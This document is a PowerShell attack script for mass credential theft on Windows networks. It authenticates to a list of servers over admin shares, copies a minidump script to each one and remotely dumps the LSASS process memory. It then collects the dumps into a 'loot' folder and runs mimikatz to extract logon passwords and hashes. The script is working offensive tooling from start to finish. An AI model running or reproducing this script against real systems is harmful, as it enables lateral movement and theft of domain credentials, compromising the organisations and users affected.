Start-Transcript
get-date
# Format input file
gc c:\temp\sql\bulkXPcmdShell.txt | % {$_.Split('.')[0]} | out-file C:\temp\sql\mapping.txt

#1 Map C drive to every server that has <user> as a local admin (also identifies targets):
Write-Host "Mapping drives"	 
get-date
Foreach ($comp in (get-content "c:\temp\sql\mapping.txt")){Write-output "Testing $comp"(net use \\$comp\c$ "<password>" /u:<domain>\<username>)}

#2 Copy minidump to each server authenticated to:
Write-Host "Uploading minidump to server"
get-date
	Foreach ($comp in (get-content "c:\temp\sql\mapping.txt")){
	 Write-output "Copying to $comp"(Copy-Item -Path C:\Users\<user>\Desktop\Powershell\Minidmp.ps1 -Destination \\$comp\c$\temp\Minidmp.ps1)
	}

#3 Remotely run minidump on each compromised system (need to copy minidmp.ps1 to each system first then copy the dmp files off each system after running this script):
Write-Host "Running minidump remotely"
get-date
	$cred = Get-Credential -Credential <user>
	Foreach ($comp in (Get-Content "c:\temp\sql\mapping.txt")){
	$s = New-PSSession -ComputerName $comp -credential $cred
	Invoke-Command -Session $s -ScriptBlock{
	    Import-module c:\temp\minidmp.ps1
	    Out-Minidump -DumpFilePath c:\temp -Process (Get-process -id (get-process lsass | select -expand id))
	    }
	}
	
#4 Extract lsass files from all servers authenticated to:
Write-Host "Download dmp files"
get-date
del C:\temp\sql\loot\*.dmp
	 Foreach ($comp in (get-content "c:\temp\sql\mapping.txt")){
     Write-output "Copied $comp"(Copy-Item -Path \\$comp\c$\temp\lsass* -Destination C:\temp\sql\loot\$comp.dmp)
	}

Write-Host "Extracting hashes"
get-date
cd C:\temp\sql\loot
Foreach ($dmp in (Get-ChildItem -Path C:\temp\sql\loot\*.dmp)){
    C:\temp\mimikatz.exe "sekurlsa::minidump $dmp" "sekurlsa::logonpasswords" "exit" | out-file c:\temp\sql\loot\mimidump.txt -append
}

Write-Host "Finished"
get-date
Stop-Transcript
